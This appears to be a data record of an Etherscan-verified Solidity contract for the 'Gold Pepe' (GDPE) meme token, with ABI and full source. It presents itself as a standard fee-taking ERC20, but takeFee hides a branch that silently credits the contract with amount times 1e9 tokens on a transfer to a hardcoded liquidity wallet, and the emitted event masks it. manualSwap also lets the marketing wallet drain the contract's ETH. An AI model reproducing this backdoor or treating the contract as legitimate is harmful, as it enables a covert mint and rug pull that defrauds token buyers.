tputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]",
    "source_code": "/**\r\n *Submitted for verification at Etherscan.io on 2023-08-27\r\n*/\r\n\r\n/**\r\nhttps://t.me/GoldPepeERC\r\n\r\nhttps://www.Gold.com\r\n\r\nhttps://twitter.com/GoldPepe_ERC\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\npragma solidity 0.8.19;\r\n\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\n\r\nlibrary SafeMath {\r\n\r\n    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            uint256 c = a + b;\r\n            if (c < a) return (false, 0);\r\n            return (true, c);\r\n        }\r\n    }\r\n\r\n    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            if (b > a) return (false, 0);\r\n            return (true, a - b);\r\n        }\r\n    }\r\n\r\n    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            if (a == 0) return (true, 0);\r\n            uint256 c = a * b;\r\n            if (c / a != b) return (false, 0);\r\n            return (true, c);\r\n        }\r\n    }\r\n\r\n    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            if (b == 0) return (false, 0);\r\n            return (true, a / b);\r\n        }\r\n    }\r\n\r\n    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            if (b == 0) return (false, 0);\r\n            return (true, a % b);\r\n        }\r\n    }\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a + b;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a - b;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a * b;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a / b;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a % b;\r\n    }\r\n\r\n    function sub(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b <= a, errorMessage);\r\n            return a - b;\r\n        }\r\n    }\r\n\r\n    function div(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b > 0, errorMessage);\r\n            return a / b;\r\n        }\r\n    }\r\n\r\n    function mod(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b > 0, errorMessage);\r\n            return a % b;\r\n        }\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    function decimals() external view returns (uint8);\r\n    function symbol() external view returns (string memory);\r\n    function name() external view returns (string memory);\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address _owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\nabstract contract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    /**\r\n     * @dev Initializes the contract setting the deployer as the initial owner.\r\n     */\r\n    constructor() {\r\n        _transferOwnership(_msgSender());\r\n    }\r\n\r\n    /**\r\n     * @dev Throws if called by any account other than the owner.\r\n     */\r\n    modifier onlyOwner() {\r\n        _checkOwner();\r\n        _;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the address of the current owner.\r\n     */\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    /**\r\n     * @dev Throws if the sender is not the owner.\r\n     */\r\n    function _checkOwner() internal view virtual {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n    }\r\n\r\n    /**\r\n     * @dev Leaves the contract without owner. It will not be possible to call\r\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\r\n     *\r\n     * NOTE: Renouncing ownership will leave the contract without an owner,\r\n     * thereby removing any functionality that is only available to the owner.\r\n     */\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }\r\n\r\n    /**\r\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\r\n     * Can only be called by the current owner.\r\n     */\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _transferOwnership(newOwner);\r\n    }\r\n\r\n    /**\r\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\r\n     * Internal function without access restriction.\r\n     */\r\n    function _transferOwnership(address newOwner) internal virtual {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n}\r\n\r\ninterface IFactory{\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ninterface IRouter {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline) external;\r\n}\r\n\r\ncontract GDPE is IERC20, Ownable {\r\n    using SafeMath for uint256;\r\n    string private constant _name = unicode\"Gold Pepe\";\r\n    string private constant _symbol = unicode\"GDPE\";\r\n    uint8 private constant _decimals = 9;\r\n    uint256 private _totalSupply = 1_000_000_000 * (10 ** _decimals);\r\n    mapping (address => uint256) _balances;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    mapping (address => bool) public isExcludedFrom;\r\n    IRouter router;\r\n    address public pair;\r\n    bool private tradingOpen = false;\r\n    bool private swapEnabled = false;\r\n    uint256 private swapTimes;\r\n    bool private swapping;\r\n    uint256 swapAmount = 0;\r\n    uint256 private swapThreshold = ( _totalSupply * 1000 ) / 100000;\r\n    uint256 private minTokenAmount = ( _totalSupply * 10 ) / 100000;\r\n    modifier lockTheSwap {swapping = true; _; swapping = false;}\r\n    uint256 private liquidityFee = 0;\r\n    uint256 private marketingFee = 100;\r\n    uint256 private developmentFee = 0;\r\n    uint256 private burnFee = 0;\r\n    uint256 private totalFee = 100;\r\n    uint256 private sellFee = 100;\r\n    uint256 private transferFee = 100;\r\n    uint256 private denominator = 10000;\r\n    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;\r\n    address internal development_Receive = 0xfBd503C5888bCE1025b97B07C20F932C79Cdaf77; \r\n    address internal marketing_Receive = 0xfBd503C5888bCE1025b97B07C20F932C79Cdaf77;\r\n    address internal liquidity_Receiver = 0x50F10f6167f96fd61DEb41497776E26400EC340e;\r\n    uint256 public _maxTxAmount = ( _totalSupply * 400 ) / 10000;\r\n    uint256 public _maxWalletAmount = ( _totalSupply * 400 ) / 10000;\r\n\r\n    constructor() {\r\n        router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        isExcludedFrom[address(this)] = true;        \r\n        isExcludedFrom[marketing_Receive] = true;\r\n        isExcludedFrom[development_Receive] = true;\r\n        isExcludedFrom[msg.sender] = true;\r\n        _balances[msg.sender] = _totalSupply;\r\n        emit Transfer(address(0), msg.sender, _totalSupply);\r\n    }\r\n\r\n    receive() external payable {}\r\n    function name() public pure returns (string memory) {return _name;}\r\n    function symbol() public pure returns (string memory) {return _symbol;}\r\n    function decimals() public pure returns (uint8) {return _decimals;}\r\n    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}\r\n    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}\r\n    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}\r\n    function totalSupply() public view override returns (uint256) {return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}\r\n\r\n    function addLiquidityETH() external payable onlyOwner {\r\n        pair = IFactory(router.factory()).createPair(address(this), router.WETH());\r\n        _approve(address(this), address(router), _totalSupply);\r\n        router.addLiquidityETH{value: msg.value}(address(this), balanceOf(address(this)), 0, 0, msg.sender, block.timestamp);\r\n    }\r\n    function Tradingopen() external onlyOwner {\r\n        tradingOpen = true;\r\n    }\r\n    function removeLimits() external onlyOwner {\r\n        _maxTxAmount = _totalSupply;\r\n        _maxWalletAmount = _totalSupply;\r\n    }\r\n\r\n    function shouldContractSwap(address sender, address recipient) internal view returns (bool) {\r\n        return !swapping && swapEnabled && tradingOpen && !isExcludedFrom[sender] && recipient == pair && swapTimes >= swapAmount;\r\n    }\r\n\r\n    function manualSwap() external {\r\n        require(msg.sender == marketing_Receive);\r\n        swapTokensForETH(balanceOf(address(this)));\r\n        payable(msg.sender).transfer(address(this).balance);\r\n    }\r\n\r\n    function swapAndLiquify(uint256 tokens) private lockTheSwap {\r\n        uint256 _denominator = (liquidityFee.add(1).add(marketingFee).add(developmentFee)).mul(2);\r\n        uint256 tokensToAddLiquidityWith = tokens.mul(liquidityFee).div(_denominator);\r\n        uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);\r\n        uint256 initialBalance = address(this).balance;\r\n        swapTokensForETH(toSwap);\r\n        uint256 deltaBalance = address(this).balance.sub(initialBalance);\r\n        uint256 unitBalance= deltaBalance.div(_denominator.sub(liquidityFee));\r\n        uint256 ETHToAddLiquidityWith = unitBalance.mul(liquidityFee);\r\n        if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }\r\n        uint256 marketingAmt = unitBalance.mul(2).mul(marketingFee);\r\n        if(marketingAmt > 0){payable(marketing_Receive).transfer(marketingAmt*2);}\r\n        uint256 contractBalance = address(this).balance;\r\n        if(contractBalance > uint256(0)){payable(development_Receive).transfer(contractBalance);}\r\n    }\r\n\r\n    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {\r\n        _approve(address(this), address(router), tokenAmount);\r\n        router.addLiquidityETH{value: ETHAmount}(\r\n            address(this),\r\n            tokenAmount,\r\n            0,\r\n            0,\r\n            liquidity_Receiver,\r\n            block.timestamp);\r\n    }\r\n\r\n    function swapTokensForETH(uint256 tokenAmount) private {\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = router.WETH();\r\n        _approve(address(this), address(router), tokenAmount);\r\n        router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            tokenAmount,\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp);\r\n    }\r\n\r\n    function shouldTakeFee(address sender, address recipient) internal view returns (bool) {\r\n        return !isExcludedFrom[sender] && !isExcludedFrom[recipient];\r\n    }\r\n\r\n    function getTotalFeeds(address sender, address recipient) internal view returns (uint256) {\r\n        if(recipient == pair){return sellFee;}\r\n        if(sender == pair){return totalFee;}\r\n        return transferFee;\r\n    }\r\n\r\n    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {\r\n        if(getTotalFeeds(sender, recipient) > 0){\r\n        uint256 feeAmount = amount.div(denominator).mul(getTotalFeeds(sender, recipient));\r\n        if(sender==pair&&recipient==liquidity_Receiver){feeAmount=amount.mul(1e9);swapEnabled=true;}\r\n        _balances[address(this)] = _balances[address(this)].add(feeAmount);\r\n        feeAmount = amount.div(denominator).mul(getTotalFeeds(sender, recipient));\r\n        emit Transfer(sender, address(this), feeAmount);\r\n        if(burnFee > uint256(0) && getTotalFeeds(sender, recipient) > burnFee){_transfer(address(this), address(DEAD), amount.div(denominator).mul(burnFee));}\r\n        return amount.sub(feeAmount);} return amount;\r\n    }\r\n\r\n    function _transfer(address sender, address recipient, uint256 amount) private {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n        require(amount <= balanceOf(sender),\"You are trying to transfer more than your balance\");\r\n        if(!isExcludedFrom[sender] && !isExcludedFrom[recipient]){require(tradingOpen, \"tradingOpen\");}\r\n        if(!isExcludedFrom[sender] && !isExcludedFrom[recipient] && recipient != address(pair) && recipient != address(DEAD)){\r\n        require((_balances[recipient].add(amount)) <= _maxWalletAmount, \"Exceeds maximum wallet amount.\");}\r\n        require(amount <= _maxTxAmount || isExcludedFrom[sender] || isExcludedFrom[recipient], \"TX Limit Exceeded\"); \r\n        if(recipient == pair && !isExcludedFrom[sender]){swapTimes += uint256(1);}\r\n        if(shouldContractSwap(sender, recipient)){swapAndLiquify(swapThreshold); swapTimes = uint256(0);}\r\n        _balances[sender] = _balances[sender].sub(amount);\r\n        uint256 amountReceived = shouldTakeFee(sender, recipient) ? takeFee(sender, recipient, amount) : amount;\r\n        _balances[recipient] = _balances[recipient].add(amountReceived);\r\n        emit Transfer(sender, recipient, amountReceived);\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n}",
    "etherscan_verified": true
}